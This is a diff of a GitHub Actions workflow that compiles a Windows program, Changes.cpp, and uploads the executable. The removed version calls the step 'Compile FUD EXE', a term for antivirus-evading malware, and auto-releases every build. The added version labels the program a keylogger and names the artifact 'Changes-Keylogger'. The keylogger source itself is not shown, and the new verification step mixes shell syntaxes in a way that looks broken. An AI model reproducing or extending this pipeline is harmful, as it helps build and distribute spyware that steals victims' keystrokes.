@@ -1,43 +1,42 @@
-name: Build Changes EXE
-on: [push, workflow_dispatch]
+name: Build Executable
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
+
 jobs:
-  build:
-    runs-on: windows-2022
+  compile:
+    runs-on: windows-latest
+    
     steps:
-    - uses: actions/checkout@v4
+    - uses: actions/checkout@v3
     
     - name: Setup MSVC
       uses: ilammy/msvc-dev-cmd@v1
-      with:
-        arch: x64
-    
-    - name: Create dist
-      shell: cmd
-      run: mkdir dist
-    
-    - name: Compile FUD EXE
-      shell: cmd
+      
+    - name: Compile
       run: |
-        cl /O2 /MT /DNDEBUG /GS- /Gy /GL /favor:blend ^
-          /Fe:dist/Changes.exe Changes.cpp gdi32.lib advapi32.lib ^
-          kernel32.lib user32.lib shell32.lib ole32.lib winhttp.lib ^
-          /link /LTCG /SUBSYSTEM:WINDOWS /ENTRY:wWinMainCRTStartup ^
-          /OPT:REF /OPT:ICF /RELEASE /INCREMENTAL:NO
+        echo "Compiling Changes keylogger..."
+        cl Changes.cpp ^
+          /link winhttp.lib user32.lib shell32.lib ole32.lib gdi32.lib ^
+          /Fe:Changes.exe ^
+          /O2 /MT /W0
         
-    - name: Check size
-      shell: cmd
-      run: dir dist\Changes.exe
-    
-    - name: Upload EXE
+    - name: Verify compilation
+      run: |
+        if exist Changes.exe (
+          echo "✅ Compilation successful!"
+          echo "File size: $((Get-Item Changes.exe).Length) bytes"
+        ) else (
+          echo "❌ Compilation failed!"
+          exit 1
+        )
+        
+    - name: Upload executable
       uses: actions/upload-artifact@v4
       with:
-        name: Changes.exe
-        path: dist/Changes.exe
-        
-    - name: Auto Release
-      if: github.ref == 'refs/heads/main'
-      uses: softprops/action-gh-release@v2
-      with:
-        files: dist/Changes.exe
-        tag_name: v${{ github.run_number }}
-        name: Changes v${{ github.run_number }}
+        name: Changes-Keylogger
+        path: Changes.exe
